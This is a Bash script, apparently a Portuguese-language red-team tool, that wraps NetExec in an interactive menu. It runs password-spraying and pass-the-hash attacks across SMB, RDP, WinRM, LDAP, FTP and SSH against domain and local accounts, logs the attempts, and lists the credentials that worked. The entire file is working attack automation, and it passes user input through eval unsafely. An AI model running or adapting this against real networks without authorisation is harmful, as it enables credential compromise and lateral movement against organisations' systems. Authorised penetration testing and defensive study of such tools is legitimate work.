#!/bin/bash

# --- Cores para o output ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # Sem Cor
# ---------------------------

# Variável global para a contagem sequencial
ACTION_COUNT=1

# Lista de protocolos a serem testados
PROTOCOLS=(smb rdp winrm ldap ftp ssh)

# --- Funções de Execução ---

execute_domain_spray() {
    local TARGETS_FILE=$1; local DOMAIN=$2; local CRED_FLAGS=$3; local LOG_FILE=$4
    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando SPRAY DE SENHAS (DOMÍNIO)...${NC}" | tee -a "$LOG_FILE"
    for proto in "${PROTOCOLS[@]}"; do
        echo "" | tee -a "$LOG_FILE"; echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Testando DOMÍNIO (Senha) para protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        eval "unbuffer nxc $proto '$TARGETS_FILE' $CRED_FLAGS -d '$DOMAIN' --continue-on-success" | tee -a "$LOG_FILE"
    done
}

execute_local_spray() {
    local TARGETS_FILE=$1; local CRED_FLAGS=$2; local LOG_FILE=$3
    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando SPRAY DE SENHAS (LOCAL)...${NC}" | tee -a "$LOG_FILE"
    for proto in "${PROTOCOLS[@]}"; do
        if [ "$proto" == "ldap" ]; then continue; fi
        echo "" | tee -a "$LOG_FILE"; echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Testando LOCAL (Senha) para protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        eval "unbuffer nxc $proto '$TARGETS_FILE' $CRED_FLAGS --local-auth --continue-on-success" | tee -a "$LOG_FILE"
    done
}

execute_domain_pth() {
    local TARGETS_FILE=$1; local DOMAIN=$2; local HASH_FILE=$3; local LOG_FILE=$4
    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando PASS-THE-HASH (DOMÍNIO)...${NC}" | tee -a "$LOG_FILE"
    for proto in "${PROTOCOLS[@]}"; do
        echo "" | tee -a "$LOG_FILE"; echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Testando DOMÍNIO (PTH) para protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        eval "unbuffer nxc $proto '$TARGETS_FILE' -u '$HASH_FILE' -H '$HASH_FILE' -d '$DOMAIN' --continue-on-success" | tee -a "$LOG_FILE"
    done
}

execute_local_pth() {
    local TARGETS_FILE=$1; local HASH_FILE=$2; local LOG_FILE=$3
    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando PASS-THE-HASH (LOCAL)...${NC}" | tee -a "$LOG_FILE"
    for proto in "${PROTOCOLS[@]}"; do
        if [ "$proto" == "ldap" ]; then continue; fi
        echo "" | tee -a "$LOG_FILE"; echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Testando LOCAL (PTH) para protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        eval "unbuffer nxc $proto '$TARGETS_FILE' -u '$HASH_FILE' -H '$HASH_FILE' --local-auth --continue-on-success" | tee -a "$LOG_FILE"
    done
}

# --- Funções Auxiliares e de Menu ---

display_summary() {
    local LOG_FILE=$1
    echo -e "\n================================================="
    echo -e "${GREEN}        Resumo dos Acessos Válidos${NC}"
    echo -e "================================================="
    grep --color=always "\[+\]" "$LOG_FILE" | grep -v "Iniciando testes"
    echo -e "\n[*] Script finalizado."
}

run_manager() {
    local attack_type=$1 # "spray" ou "pth"
    clear
    
    local title="Spray de Senhas"; if [ "$attack_type" == "pth" ]; then title="Pass-the-Hash"; fi
    echo "--- Menu: $title ---"
    echo "1) Ataque de Domínio"
    echo "2) Ataque Local"
    echo "3) Ataque Completo (Domínio + Local)"
    read -p "Escolha o escopo do ataque [1-3]: " scope_choice

    local scope_type=""
    case $scope_choice in
        1) scope_type="domain" ;;
        2) scope_type="local" ;;
        3) scope_type="full" ;;
        *) echo -e "${RED}Opção inválida.${NC}"; return ;;
    esac

    read -p "Digite o caminho para o arquivo de ALVOS: " TARGETS_FILE
    if [ ! -f "$TARGETS_FILE" ]; then echo -e "${RED}Erro: Arquivo não encontrado.${NC}"; return; fi

    local current_date=$(date +%Y-%m-%d)
    local sequence=$(printf "%02d" $ACTION_COUNT)
    local LOG_FILE="resultados_${attack_type}_${current_date}_${scope_type}_${sequence}.log"
    echo -e "\n${YELLOW}[*] Os resultados serão salvos em: ${GREEN}$LOG_FILE${NC}"

    local DOMAIN=""
    if [ "$scope_type" != "local" ]; then
        read -p "Digite o nome do DOMÍNIO: " DOMAIN
    fi
    
    if [ "$attack_type" == "spray" ]; then
        read -p "Digite o caminho para o arquivo de USUÁRIOS: " USERS_FILE
        if [ ! -f "$USERS_FILE" ]; then echo -e "${RED}Erro: Arquivo não encontrado.${NC}"; return; fi
        read -p "Digite o caminho para o arquivo de SENHAS: " PASSWORDS_FILE
        if [ ! -f "$PASSWORDS_FILE" ]; then echo -e "${RED}Erro: Arquivo não encontrado.${NC}"; return; fi
        local creds="-u '$USERS_FILE' -p '$PASSWORDS_FILE'"
        if [ "$scope_type" == "domain" ]; then execute_domain_spray "$TARGETS_FILE" "$DOMAIN" "$creds" "$LOG_FILE"; fi
        if [ "$scope_type" == "local" ]; then execute_local_spray "$TARGETS_FILE" "$creds" "$LOG_FILE"; fi
        if [ "$scope_type" == "full" ]; then execute_domain_spray "$TARGETS_FILE" "$DOMAIN" "$creds" "$LOG_FILE"; execute_local_spray "$TARGETS_FILE" "$creds" "$LOG_FILE"; fi
    else # pth
        read -p "Digite o caminho para o arquivo de HASHES (formato usuario:hash): " HASH_FILE
        if [ ! -f "$HASH_FILE" ]; then echo -e "${RED}Erro: Arquivo não encontrado.${NC}"; return; fi
        if [ "$scope_type" == "domain" ]; then execute_domain_pth "$TARGETS_FILE" "$DOMAIN" "$HASH_FILE" "$LOG_FILE"; fi
        if [ "$scope_type" == "local" ]; then execute_local_pth "$TARGETS_FILE" "$HASH_FILE" "$LOG_FILE"; fi
        if [ "$scope_type" == "full" ]; then execute_domain_pth "$TARGETS_FILE" "$DOMAIN" "$HASH_FILE" "$LOG_FILE"; execute_local_pth "$TARGETS_FILE" "$HASH_FILE" "$LOG_FILE"; fi
    fi
    
    ((ACTION_COUNT++))
    display_summary "$LOG_FILE"
}

# --- Loop Principal do Menu ---
while true; do
    clear
    echo -e "${BLUE}"
cat << "EOF"
             ____ ____  _____           __ _  ___               
            |  _ \___ \|  __ \         /_ | |/ _ \              
   ___ _   _| |_) |__) | |__) |___  __ _| | | | | |_ __         
  / __| | | |  _ <|__ <|  _  // __|/ _` | | | | | | '__|        
 | (__| |_| | |_) |__) | | \ \\__ \ (_| | | | |_| | |           
  \___|\__, |____/____/|_|  \_\___/\__,_|_|_|\___/|_|           
  _____ __/ |         _____                       _             
 |  __ \___/         / ____|                     (_)            
 | |__) |_ _ ___ ___| (___  _ __  _ __ __ _ _   _ _ _ __   __ _ 
 |  ___/ _` / __/ __|\___ \| '_ \| '__/ _` | | | | | '_ \ / _` |
 | |  | (_| \__ \__ \____) | |_) | | | (_| | |_| | | | | | (_| |
 |_|   \__,_|___/___/_____/| .__/|_|  \__,_|\__, |_|_| |_|\__, |
                           | |               __/ |         __/ |
                           |_|              |___/         |___/                                                 
EOF
    echo -e "${NC}"
    echo ""
    echo -e "${YELLOW}Escolha o tipo de ataque:${NC}"
    echo -e "${GREEN}1)${NC} Password Spray (usando senhas)"
    echo -e "${GREEN}2)${NC} Pass-the-Hash (usando hashes NTLM)"
    echo -e "${RED}3)${NC} Sair"
    echo ""
    read -p "Opção [1-3]: " choice

    case $choice in
        1) run_manager "spray" ;;
        2) run_manager "pth" ;;
        3) clear; echo -e "${YELLOW}Saindo...${NC}"; exit 0 ;;
        *) echo -e "${RED}Opção inválida.${NC}" ;;
    esac

    echo ""
    read -p "Pressione [Enter] para retornar ao menu..."
done
